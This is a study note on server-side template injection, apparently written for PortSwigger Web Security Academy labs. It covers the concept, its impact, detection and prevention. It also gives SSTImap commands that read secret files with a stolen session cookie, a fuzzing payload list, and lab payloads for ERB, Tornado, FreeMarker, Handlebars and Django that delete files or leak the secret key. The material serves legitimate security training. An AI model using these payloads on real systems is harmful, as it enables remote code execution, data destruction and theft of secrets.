---
description: >-
  CWE-1336: Improper Neutralization of Special Elements Used in a Template
  Engine
---

# SSTI

[Server-side template injection | Web Security Academy](https://portswigger.net/web-security/server-side-template-injection)

*   **What is server-side template injection?**

    Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

    Template engines are designed to generate web pages by combining fixed templates with volatile data. Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server. As the name suggests, server-side template injection payloads are delivered and evaluated server-side, potentially making them much more dangerous than a typical client-side template injection.
*   **What is the impact of server-side template injection?**

    Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.

    Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable to server-side template injection. The classic example is an email that greets each user by their name, such as the following extract from a Twig template:

    ```
    $output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
    ```

    This is not vulnerable to server-side template injection because the user's first name is merely passed into the template as data.

    However, as templates are simply strings, web developers sometimes directly concatenate user input into templates prior to rendering. Let's take a similar example to the one above, but this time, users are able to customize parts of the email before it is sent. For example, they might be able to choose the name that is used:

    ```
    $output = $twig->render("Dear " . $_GET['name']);
    ```

    In this example, instead of a static value being passed into the template, part of the template itself is being dynamically generated using the `GET` parameter `name`. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the `name` parameter as follows:

    ```
    <http://vulnerable-website.com/?name={{bad-stuff-here}>}
    ```

    Vulnerabilities like this are sometimes caused by accident due to poor template design by people unfamiliar with the security implications. Like in the example above, you may see different components, some of which contain user input, concatenated and embedded into a template. In some ways, this is similar to [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerabilities occurring in poorly written prepared statements.

    However, sometimes this behavior is actually implemented intentionally. For example, some websites deliberately allow certain privileged users, such as content editors, to edit or submit custom templates by design. This clearly poses a huge security risk if an attacker is able to compromise an account with such privileges.
*   W**ork flow**

    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/29ca1d59-f65b-458e-87af-7256836e7162/Untitled.png)

    **Detect**

    try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\\`

    **Identify**

    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1f30bf8a-bf14-4d1e-9fb0-14f3e00cdadf/Untitled.png)

    **Exploit**

    [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
*   **How to prevent server-side template injection vulnerabilities**

    The best way to prevent server-side template injection is to not allow any users to modify or submit new templates. However, this is sometimes unavoidable due to business requirements.

    One of the simplest ways to avoid introducing server-side template injection vulnerabilities is to always use a "logic-less" template engine, such as Mustache, unless absolutely necessary. Separating the logic from presentation as much as possible can greatly reduce your exposure to the most dangerous template-based attacks.

    Another measure is to only execute users' code in a sandboxed environment where potentially dangerous modules and functions have been removed altogether. Unfortunately, sandboxing untrusted code is inherently difficult and prone to bypasses.

    Finally, another complementary approach is to accept that arbitrary code execution is all but inevitable and apply your own sandboxing by deploying your template environment in a locked-down Docker container, for example
*   **SSTI Identified Using `SSTImap`**

    > SSTI can be identified using the tool `SSTImap`. The limitations of this tool is that the template expression `{{7*7}}` results are sometimes only evaluated by another `GET request` or calling another function in the application, as the output is not directly reflected or echoed into the response where the template expression was posted.

    ```xml
    python /opt/SSTImap/sstimap.py --engine erb -u <https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock> --os-cmd "cat /home/carlos/secret"
    ```

    > POST request with the data `param` to test and send payload using `SSTImap` tool.

    ```xml
    python /opt/SSTImap/sstimap.py -u <https://TARGET.net/product/template?productId=1> --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
    ```

    ![https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sstimap.png](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sstimap.png)
*   **SSTI payloads to manually identify vulnerability. →** [Security-Hub/ssti.txt at main · M8SZT8/Security-Hub (github.com)](https://github.com/M8SZT8/Security-Hub/blob/main/Fuzzing%20Lists/ssti.txt)

    ```xml
    ${{<%[%'"}}%\\.,
    }}{{7*7}} 

    {{fuzzer}}
    ${fuzzer}
    ${{fuzzer}}

    ${7*7}
    <%= 7*7 %>
    ${{7*7}}
    #{7*7}
    ${foobar}

    <div data-gb-custom-block data-tag="debug"></div>

    ```
* **Exploit**
  *   **Construct a payload to delete Carlos's file**

      `<%= system("rm /home/carlos/morale.txt") %>`
  *   [**Basic server-side template injection (code context)**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

      ```xml
      blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')
      ```
  *   [**Server-side template injection using documentation**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

      ```xml
      <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
      ```
  *   [**Server-side template injection in an unknown language with a documented exploit**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

      ```xml
      <https://YOUR-LAB-ID.web-security-academy.net/?message=wrtz%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d>
      ```
  *   [**Server-side template injection with information disclosure via user-supplied objects**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

      ```xml
      ```

\{{settings.SECRET\_KEY\}} \`\`\` - Exploit - ssti to rce https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e
